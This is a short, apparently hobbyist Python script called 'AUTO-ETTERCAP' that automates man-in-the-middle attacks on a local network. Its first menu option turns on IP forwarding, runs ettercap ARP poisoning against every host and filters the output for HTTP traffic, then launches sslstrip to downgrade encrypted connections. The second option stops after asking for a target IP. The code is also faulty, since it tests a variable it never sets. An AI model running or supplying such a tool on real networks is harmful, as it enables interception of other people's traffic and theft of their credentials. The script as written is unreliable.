#!/usr/bin/env python

#imports
import os

os.system("clear")
print("\033[37mAUTO-ETTERCAP")

print("\033[37m By Krish Pranav")

def options():
    print ("(1) - Mitm all Network")
    print ("(2) - Mitm set target")
    print ("(0) - Close")
    options =(int(input("Choose Your Option: ")))
    if option == 1:
        os.system("echo 1> /proc/sys/net/ipv4/ip_forward")
        os.system("ettercap -TqM ARP:REMOTE //// | grep 'HTTP: '")
        os.system("sslstrip -a -l 4003")
    elif option == 2:
        host = input("Set IP Host:")
        








